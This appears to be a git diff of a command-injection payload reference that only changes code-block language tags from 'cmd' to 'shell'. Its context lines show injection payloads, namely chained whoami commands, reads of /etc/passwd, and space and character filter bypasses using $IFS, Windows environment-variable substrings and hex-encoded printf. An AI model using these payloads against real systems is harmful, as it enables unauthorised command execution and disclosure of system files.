@@ -56,7 +56,7 @@ $(cat${IFS}/etc/passwd)
 
 ### Windows Command Injection Examples
 
-```cmd
+```shell
 # Basic injection
 ping -n 1 127.0.0.1 & whoami
 ping -n 1 127.0.0.1 && whoami
@@ -90,7 +90,7 @@ cat$IFS$9/etc/passwd
 ```
 
 #### Windows Space Bypass
-```cmd
+```shell
 # Using environment variable substrings
 ping%PROGRAMFILES:~10,1%127.0.0.1
 
@@ -121,7 +121,7 @@ $(printf "\x77\x68\x6f\x61\x6d\x69")  # whoami
 
 #### Windows Character Bypass
 
-```cmd
+```shell
 # Using environment variable substrings
 echo %HOMEPATH:~6,-11%  # Returns "\"
 
